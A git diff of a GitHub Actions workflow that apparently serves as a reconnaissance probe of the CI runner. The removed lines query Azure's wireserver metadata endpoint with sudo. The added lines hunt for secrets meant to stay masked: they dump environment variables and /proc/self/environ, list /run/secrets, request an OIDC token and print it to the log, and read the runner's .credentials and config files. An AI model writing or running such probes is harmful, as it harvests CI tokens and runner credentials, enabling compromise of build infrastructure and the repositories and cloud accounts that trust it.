@@ -1,41 +1,69 @@
-name: Wireserver Probe
+name: Actions Runtime Token Probe
 on: [push]
 
 jobs:
-  wireserver:
+  runtime:
     runs-on: ubuntu-latest
+    permissions:
+      id-token: write  # for OIDC token
+      contents: read
     steps:
-      - name: Try wireserver with right headers
+      - name: Probe Actions internal endpoints
         shell: bash
         run: |
           set +e
           
-          echo "===== goalstate via sudo ====="
-          sudo curl --max-time 10 -s "http://168.63.129.16/machine?comp=goalstate" -H "x-ms-version: 2015-04-05" 2>&1 | head -100
+          echo "===== Internal env ====="
+          # ACTIONS_RUNTIME_TOKEN, ACTIONS_RUNTIME_URL, ACTIONS_RESULTS_URL, ACTIONS_CACHE_URL etc are typically masked but exist in sub-procs
+          env | grep -iE "actions|github|azure" | head -50
           echo ""
           
-          echo "===== machine via sudo ====="
-          sudo curl --max-time 10 -s "http://168.63.129.16/machine" -H "x-ms-version: 2015-04-05" 2>&1 | head -50
+          echo "===== /proc/self/environ (might have unmasked vars) ====="
+          tr '\0' '\n' < /proc/self/environ | head -30
           echo ""
           
-          echo "===== shared config ====="
-          sudo curl --max-time 10 -s "http://168.63.129.16/machine?comp=config&type=sharedConfig&incarnation=1" -H "x-ms-version: 2015-04-05" 2>&1 | head -100
-          echo ""
+          echo "===== Look at runner work dir ====="
+          ls -la /home/runner/runners/2.334.0/_diag/ 2>&1 | head -20
+          ls -la /home/runner/runners/*/ 2>&1 | head -20
           
-          echo "===== As non-sudo (should be BLOCKED) ====="
-          curl --max-time 5 -s "http://168.63.129.16/machine?comp=goalstate" -H "x-ms-version: 2015-04-05" 2>&1 | head -10 || echo "blocked"
-          echo ""
+          echo "===== ACTIONS_RESULTS_URL test ====="
+          # Check if any internal vars were exported by job init
+          set | grep -iE "ACTIONS_R|ACTIONS_T|ACTIONS_C|ACTIONS_I" | head -10
           
-          echo "===== Heartbeat status ====="
-          sudo curl --max-time 10 -s "http://168.63.129.16/machine?comp=health" -H "x-ms-version: 2015-04-05" -X POST 2>&1 | head -30
-          echo ""
+          echo "===== Listening ports on runner ====="
+          ss -tlnp 2>&1 | head -20
           
-          echo "===== HostGAPlugin (sometimes leaks more) ====="
-          # Most Azure VMs run HostGAPlugin on port 32526 locally
-          sudo curl --max-time 5 -s "http://127.0.0.1:32526/vmSettings" 2>&1 | head -30 || echo "no host plugin"
+          echo "===== Process list ====="
+          ps aux | head -30
           
-          echo ""
-          echo "===== /run/extensions ====="
-          sudo find /run /var/run -name "*.json" 2>&1 | head -10
+          echo "===== Current user / ID ====="
+          id
+          whoami
+          groups
+          
+          echo "===== /run/secrets etc ====="
+          sudo find /run -name "*.json" 2>&1 | head -20
+          sudo find /run -name "*.env" 2>&1 | head -10
+          sudo ls -la /run/secrets/ 2>&1 || echo "no /run/secrets"
+          
+          echo "===== Try ACTIONS_RUNTIME_TOKEN via OIDC endpoint ====="
+          # The OIDC endpoint URL is in env when permissions has id-token
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            echo "ACTIONS_ID_TOKEN_REQUEST_URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
+            # Get OIDC token
+            curl -s -H "Accept: application/json" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=test" | head -c 200
+            echo ""
+          else
+            echo "No OIDC URL"
+          fi
+          
+          echo "===== ACTIONS_RESULTS_URL & RUNTIME_URL via runner config ====="
+          sudo cat /home/runner/runners/*/.runner 2>&1 | head -10
+          sudo cat /home/runner/runners/*/.credentials 2>&1 || echo "no .credentials"
+          sudo cat /home/runner/runners/*/.path 2>&1 || echo "no .path"
+          sudo cat /home/runner/runners/*/.env 2>&1 || echo "no .env"
+          
+          # The runner stores its config files
+          sudo find /home/runner/runners -name ".*" 2>&1 | head -20
           
           true
